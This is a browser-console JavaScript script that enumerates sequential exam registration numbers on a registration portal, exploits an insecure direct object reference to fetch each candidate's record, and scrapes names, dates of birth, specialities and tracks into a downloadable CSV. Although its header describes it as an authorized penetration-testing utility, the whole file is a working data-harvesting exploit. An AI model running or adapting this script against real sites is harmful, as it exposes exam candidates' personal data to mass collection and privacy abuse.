/**
 * verify-matricules-filieres.js
 *
 * Authorized security-testing utility: bulk-checks a range of exam
 * registration numbers (matricules) against a registration portal to
 * confirm whether an IDOR (Insecure Direct Object Reference) exposes
 * candidate records — including name, date of birth, spécialité and
 * filière — to any unauthenticated visitor who can guess a sequential ID.
 *
 * Usage: run in the browser DevTools console while on the target
 * origin, inside the scope of an authorized penetration test / bug
 * bounty engagement only. Do not run against systems you do not have
 * explicit written authorization to test.
 *
 * Adjust `debut`, `fin`, and the matricule prefix/format below to match
 * the engagement's agreed test range.
 */
(async () => {
    const debut = 1;
    const fin = 150;
    const resultat = [];

    // Libellés recherchés pour chaque champ, du plus spécifique au plus générique
    const champsRecherches = {
        Nom: /\bnoms?\s*(et\s*pr[ée]nom)?\b/i,
        DateNaissance: /date\s*de\s*naissance|n[ée]\(?e?\)?\s*le/i,
        Specialite: /sp[ée]cialit[ée]/i,
        Filiere: /fili[èe]re|formation/i
    };

    function extraireChamp(doc, regex) {
        const elements = [...doc.querySelectorAll("input, select, textarea, td, th, label, p, span, div")];

        for (const element of elements) {
            const texte = element.textContent.trim();

            if (regex.test(texte)) {
                const valeur =
                    element.value ||
                    element.nextElementSibling?.textContent?.trim() ||
                    texte;

                if (valeur && valeur.length > 1) {
                    return valeur.replace(/\s+/g, " ").trim();
                }
            }
        }

        return "";
    }

    console.log("🔎 Vérification des matricules...");

    for (let i = debut; i <= fin; i++) {
        const matricule = `26SP${String(i).padStart(5, "0")}`;
        const url = `/registration-display-submit/SP/${matricule}`;

        try {
            const response = await fetch(url);
            const html = await response.text();

            const existe =
                response.ok &&
                html.includes(matricule) &&
                html.includes("Inscription au concours");

            let nom = "";
            let dateNaissance = "";
            let specialite = "";
            let filiere = "";

            if (existe) {
                const doc = new DOMParser().parseFromString(html, "text/html");

                nom = extraireChamp(doc, champsRecherches.Nom);
                dateNaissance = extraireChamp(doc, champsRecherches.DateNaissance);
                specialite = extraireChamp(doc, champsRecherches.Specialite);
                filiere = extraireChamp(doc, champsRecherches.Filiere);
            }

            resultat.push({
                Matricule: matricule,
                Existe: existe ? "OUI" : "NON",
                Nom: nom,
                DateNaissance: dateNaissance,
                Specialite: specialite,
                Filiere: filiere,
                Lien: existe
                    ? new URL(url, window.location.origin).href
                    : ""
            });

            console.log(
                `${i}/150 — ${matricule} → ${existe ? "✅" : "❌"} ${nom} ${filiere}`
            );

        } catch (erreur) {
            resultat.push({
                Matricule: matricule,
                Existe: "ERREUR",
                Nom: "",
                DateNaissance: "",
                Specialite: "",
                Filiere: "",
                Lien: ""
            });

            console.log(`${i}/150 — ${matricule} → ⚠️ ERREUR`);
        }

        await new Promise(resolve => setTimeout(resolve, 150));
    }

    // Export CSV compatible Excel
    const lignes = [
        ["Matricule", "Existe", "Nom", "Date de naissance", "Spécialité", "Filière concourue", "Lien"],
        ...resultat.map(x => [
            x.Matricule,
            x.Existe,
            x.Nom,
            x.DateNaissance,
            x.Specialite,
            x.Filiere,
            x.Lien
        ])
    ];

    const csv = "﻿" + lignes
        .map(ligne =>
            ligne.map(cellule =>
                `"${String(cellule).replace(/"/g, '""')}"`
            ).join(";")
        )
        .join("\n");

    const blob = new Blob([csv], {
        type: "text/csv;charset=utf-8;"
    });

    const lien = document.createElement("a");
    lien.href = URL.createObjectURL(blob);
    lien.download = "matricules_26SP00001_a_26SP00150.csv";

    document.body.appendChild(lien);
    lien.click();
    lien.remove();

    console.log("================================");
    console.log("✅ TERMINÉ");
    console.log(`📊 ${resultat.length} matricules vérifiés`);
    console.log("📁 Fichier CSV téléchargé");
    console.log("================================");

    console.table(resultat);
})();
